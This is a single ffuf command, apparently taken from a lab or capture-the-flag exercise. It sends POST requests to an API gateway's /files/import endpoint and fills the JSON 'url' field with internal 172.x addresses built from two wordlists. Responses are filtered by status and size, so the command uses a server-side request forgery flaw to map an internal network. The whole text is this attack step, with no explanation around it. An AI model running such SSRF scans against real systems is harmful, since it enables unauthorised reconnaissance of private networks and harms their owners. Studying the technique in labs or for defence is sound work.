ffuf -X POST -u http://apigateway:8000/files/import \
  -d '{"url":"http://172.FUZZ1.FUZZ2.1:8000"}' \
  -H "Content-Type:application/json" \
  -w ./range2.txt:FUZZ1 -w ./range3.txt:FUZZ2 \
  -mc 500 -ms 108 -timeout 2 -t 20
